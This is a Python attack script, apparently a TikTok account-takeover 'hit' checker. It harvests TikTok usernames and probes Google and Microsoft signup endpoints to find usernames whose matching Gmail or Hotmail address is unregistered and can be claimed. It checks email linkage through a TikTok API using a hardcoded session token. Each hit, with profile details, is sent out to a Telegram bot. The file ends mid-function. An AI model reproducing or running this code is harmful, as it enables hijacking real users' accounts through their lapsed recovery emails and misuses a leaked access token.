import os
try:from requests import get,post
except:os.system("pip install requests")
try:from threading import Thread
except:os.system("pip install threading")
try:import uuid
except:os.system("pip install uuid")
try:from user_agent import generate_user_agent
except:os.system("pip install user_agent")
from requests import get,post
from threading import Thread
from random import choice,randrange
import sys,uuid, random, multiprocessing, http.client, re, requests, time, urllib.parse
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'


def clear():
            sd= choice([J1,J2,J21,J22,F1,C1,P1,P2])
            sd2= choice([J1,J2,J21,J22,F1,C1,P1,P2])
            os.system('clear||cls')
            print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22}D̴̦̝̼͋̐͘E̸͕͎̾̈́̓M̴̙̦̼͐͊O̴̡̝̙͌͝ {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
            print(sd+f"""
      
{sd2}  ██████╗░███████╗███╗░░░███   ╗░█████╗░ 
 ██╔══██╗██╔════╝████╗░████  ║██╔══██╗
 ██║░░██║█████╗░░██╔████╔██ ║██║░░██║   
 ██║░░██║██╔══╝░░██║╚██╔╝██  ║██║░░██║  
 ██████╔╝███████╗██║░╚═╝░██ ║╚█████╔╝   
 ╚═════╝░╚══════╝╚═╝░░░░░╚═    ╝░╚════╝░   
        {X}¸.•´¯`•.¸¸ {F}Tik Tok {X}¸.•´¯`•.¸¸                       
              {F}TLE : @N_C_P / @DEC_DEMO
    """)
            print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22}D̴̦̝̼͋̐͘E̸͕͎̾̈́̓M̴̙̦̼͐͊O̴̡̝̙͌͝ {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
clear()
class DEMO:
  def __init__(self):
    self.good_tiktok=0
    self.bad_tiktok=0
    self.good_gmail=0
    self.bad_gmail=0
    self.nudes=[]
    self.hits=[]
    self.list=[]
    self.cok=[]
    self.ttwids=[]
    self.msTokens=[]
    self.token= input(f"{F}ENTAR Tokin: {Z}")
    self.id= input(f"{F}ENTAR Id: {Z}")
    response = get(f"https://api.telegram.org/bot{self.token}/getChat?chat_id={self.id}")
    if response.status_code == 200:
        data = response.json()
        if data["ok"]:
            user_info = data["result"]
            user_id = user_info['id']
            cleaned_first_name = user_info['first_name'].replace('\u206a', '').replace('\u2067', '')
        else:exit("خطا")
    else:
        exit("WRNOG TOKEN OR ID")
    os.system('clear' if os.name == 'posix' else 'cls')
    clear()
    print(f"\n\t\tWelcome {cleaned_first_name}")
    print(f'\n\n{C1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'\t\t {X}[{F}1{X}]{C1} Gmail \n\t\t {X}[{F}2{X}]{C1} Hotmail')
    print(f'{C1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    
    print('')
    xx = input(f" {P1}[{Z}•{P1}] ENTER :  ")
   
   
    os.system('clear' if os.name == 'posix' else 'cls')    
    for _ in range(100):
    	Thread(target=self.home, args=(xx)).start()    


  
  def get_users(self):
    while True:
      try:
        usernames=[]
        g=choice(['دجحخهعغفقثصضشسيبلاتنمكطظزوةىلارؤءئ','azertyuiopmlkjhgfdsqwxcvbn','アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン','あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん'])
        keyword=''.join((choice(g) for i in range(randrange(3,15))))
        headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'dnt': '1',
                'origin': 'https://livecounts.io',
                'priority': 'u=1, i',
                'referer': 'https://livecounts.io/',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
            }
        response = get('https://tiktok.livecounts.io/user/search/'+str(keyword), headers=headers).json()['userData']
        for user in response:
          username=user['id']
          follower_count=int(user['stats']['followers'])
          if follower_count>=0:
              if '_' not in username:
                          if username not in self.list:
                              if len(username) > 5:
                          	    self.list.append(username)
                          	    usernames.append(username)
          return usernames
      except Exception as e:''
      	

  def gg00(self):
        ua=str(generate_user_agent())
        time0=time()
        conn = http.client.HTTPSConnection('accounts.google.com')
        while True:
            try:
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
    }
                conn.request(
        'GET',
        '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
        headers=headers
    )
                response = conn.getresponse().info()
                __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
                tl=str(response).split('TL=')[1].split('\n')[0]
                break
            except Exception as e:''
        while True:
            try:
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent':  ua,
    }
                response = requests.get(
        'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
        cookies=cookies,
        headers=headers,
    )
                tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
                hl=tok[0]
                s1=tok[28]
                at=tok[33]
                break
            except Exception as e:''
        while True:
            try:
                name=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn') for i in range(randrange(4,13)))
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': hl,
        'TL': tl,
    }
                data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        while True:
            try:
                yaer=str(randrange(1980,2007))
                month=str(randrange(1,12))
                day=str(randrange(1,28))
                cookies = {
        '__Host-GAPS': __Host_GAPS
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': hl,
        'TL': tl,
    }

                data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEcIsRVixEyLwSRrl-UsP-MSM8LflbsVQbuiwLQLEbJLFMSlolNVvrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwiGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP-nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl-RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp-LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZRdDgesg8pQ9R-5_yAhQc67C1CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxo3Gdlx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHj4LTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        tm=time()-time0
        try:
            return {
                'tokens':{
                    '__Host-GAPS':__Host_GAPS,
                    'TL':tl,
                    'hl':hl,
                    'at':at,
                    's1':s1,
                },
                'info':{
                    'name':name,
                    'birthday':{
                        'day:month:year':day+':'+month+':'+yaer,
                        'day':day,
                        'month':month,
                        'year':yaer,
                    },
                    'time_get_tokens':tm,
                    'time':time(),               
                        },
                'errors':[],
            }
        except:
            return {
                'errors':['error get tokens'],
                'tokens':{

                },
                'info':{
                    'time':time(),
                    'time_get_tokens':tm,
                },
            }

  def check_linked(self,email):
    email = str(email)
    while True:
      try:
        res = requests.post('https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?aid=1233',headers={"x-tt-token": "03b312f34e03844c764c85db6034335f9b004fda70ef818d5091f1675df8d3dfdb16f38d56d8ee71b3b2480fa76d885e44ba9bcf3a6d5fc4f69e883f5f6a5865b12197d5bc163fa7cde9cb24ec0cde4565883ecfdaf86aca2fd03075f36b557209e9a-CkA4NjIyZTY4ZjY2NmU5Mjc4NWMxNGM5NzAwOGY5Zjc3ODQyNjk2M2I0NTFiZTJlOTQzNzYyOWY5MDAwOWNhMGNj-2.0.0", "sdk-version": "2"},data={"email": email}).text
        if "Email is linked to another account. Unlink or try another email." in res:
          return True
        else:
          return False
      except:''
  def get_tokens(self):
      while True:
        try:
          g=self.gg00()['tokens']
          TL=g['TL']
          __Host_GAPS=g['__Host-GAPS']
          at=g['at']
          hl=g['hl']
          s1=g['s1']
          try:
            os.remove(f'tokens.txt')
          except:''
          with open(f'tokens.txt','a') as a:
            a.write(f'{TL}///{__Host_GAPS}///{at}///{hl}///{s1}')
          return 
        except Exception as e:''
  def check_tokens(self):
      while True:
        try:
          try:
            o=open('tokens.txt','r').read().splitlines()[0].split('///')
            TL=o[0]
            __Host_GAPS=o[1]
            at=o[2]
            hl=o[3]
            s1=o[4]
          except Exception as e:
            self.get_tokens()
            return
          email=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn1234567890.') for i in range(randrange(10,15)))
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            return
          else:
            self.get_tokens()
            return
        except Exception as e:''
  def check_gmail(self,email):
      while True:
        try:
          if '@' in email:email=email.split('@')[0]
          self.check_tokens()
          o=open('tokens.txt','r').read().splitlines()[0].split('///')
          TL=o[0]
          __Host_GAPS=o[1]
          at=o[2]
          hl=o[3]
          s1=o[4]
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            return True
          else:
            return False
        except Exception as e:''
  def check_hotmail(self,email):
    while True:
      try:
     
        headers = {
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'accept-language': 'en-US,en;q=0.9',
  'upgrade-insecure-requests': '1',
  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
        response = requests.get('https://signup.live.com/signup', headers=headers)
        canary=str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
        amsc=response.cookies.get_dict()['amsc']
        cookies = {
  'amsc': amsc,
}
        headers = {
  'accept': 'application/json',
  
  'accept-language': 'en-US,en;q=0.9',
  'canary': canary,
  'content-type': 'application/json; charset=utf-8',
  'origin': 'https://signup.live.com',
  'referer': 'https://signup.live.com/',
  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}        
        json_data = {
  'clientExperiments': [
      {
          'parallax': 'enableplaintextforsignupexperiment',
          'control': 'enableplaintextforsignupexperiment_control',
          'treatments': [
              'enableplaintextforsignupexperiment_treatment',
          ],
      },
  ],
}       
        response = requests.post(
  'https://signup.live.com/API/EvaluateExperimentAssignments',
  cookies=cookies,
  headers=headers,
  json=json_data,
).json()
        canary=response['apiCanary']
        cookies = {
  'amsc': amsc,
}
        headers = {
  'accept': 'application/json',
  'accept-language': 'en-US,en;q=0.9',
  'canary': canary,
  'content-type': 'application/json; charset=utf-8',
  'origin': 'https://signup.live.com',
  'referer': 'https://signup.live.com/',
  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
        json_data = {
  'signInName': email+'@hotmail.com'
}
        response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data).text
        if '"isAvailable":true' in response:
        	return True
        else:
        	return False  
      except Exception as e:''
  def info(self,username,xx):
    try:
      if username in self.hits:
        return
      self.hits.append(username)
      inf=self.information(username)
      import requests as r
      try:
          response = r.get('https://aegos.pythonanywhere.com/tiktok',params={'username':username}).json()
          Date=response["date"]
      except:
          Date="None"
      if xx =='1':
      	username = username+'@gmail.com'
      elif xx =='2':
      	username = username+'@hotmail.com'
      else:
      	pass
      sd2= choice([J1,J2,J21,J22,F1,C1,P1,P2])
      ff = (f'''𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 🧪
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10
❄ 𝗡𝗮𝗺𝗲 : {inf['name']}    
❄ 𝗨𝘀𝗲𝗿𝗡𝗮𝗺𝗲 : {username}    
❄ 𝗘𝗺𝗮𝗶𝗹 : {username}    
❄ 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {inf['followers']}    
❄ 𝗳𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 : {inf['following']}    
❄ 𝗟𝗶𝗸𝗲 : {inf['like']}    
❄ 𝗜𝗗 : {inf['id']}    
❄ 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 : {inf['private']}    
❄ 𝗩𝗶𝗱𝗲𝗼 : {inf['video']}    
❄ 𝗗𝗮𝘁𝗲 : {Date}    
❄ 𝗧𝗟𝗘 : @N_C_P / @DEC_DEMO
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10''')
      print(sd2,ff)
    except:      
      ff = (f'''𝗡𝗘𝗪 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 🧪
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10
❄ 𝗘𝗺𝗮𝗶𝗹 : {username}    
❄ 𝗗𝗮𝘁𝗲 : {Date}    
❄ 𝗧𝗟𝗘 : @N_C_P / @DEC_DEMO
◎︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10''')
    while True:
      try:
        get('https://api.telegram.org/bot'+self.token+'/sendMessage?chat_id='+self.id+'&text='+ff)
        return
      except Exception as e:''
  def information(self,username):
    try:
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
            }

        try:
            tikinfo = get(f'https://www.tiktok.com/@{username}', headers=headers).text            
            info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
            try:
                name = str(info.split('nickname":"')[1]).split('",')[0]
            except:
                name = ""
            try:
                followers = str(info.split('followerCount":')[1]).split(',"')[0]
            except:
                followers = ""
            try:
                following = str(info.split('followingCount":')[1]).split(',"')[0]
            except:
                following = ""
            try:
                like = str(info.split('heart":')[1]).split(',"')[0]
            except:
                like = ""
            try:
                video = str(info.split('videoCount":')[1]).split(',"')[0]
            except:
                video = ""
            try:
                id = str(info.split('id":"')[1]).split('",')[0]
            except:
                id = ""                
            try:
                bio = str(info.split('signature":"')[1]).split('",')[0]
            except:
                bio = ""
            try:
                country = str(info.split('region":"')[1]).split('",')[0]
            except:
                country = ""
            try:
                private = str(info.split('privateAccount":')[1]).split(',"')[0]
            except:
                private = ""                            
            return {                                    
                "name": name,
                "username": username,
                "followers": followers,
                "following": following,
                "like": like,
                "video": video,
                "private": private,
                "id": id,
                "bio": bio,
                "BY": "@g_4_q"
            }
        except:
          return {                                    
              "name": '',
              "username": '',
              "followers": '',
              "following": '',
              "like": '',
              "video": '',
              "private": '',
              "id": '',
              "bio": '',
              "BY": "@g_4_q"
          }
    except :
        return {                                    
            "name": '',
            "username": '',
            "followers": '',
            "following": '',
            "like": '',
            "video": '',
            "private": '',
            "id": '',
            "bio": '',
            "BY": "@g_4_q"
        }


  def home(self,xx):
    while True:
      try:
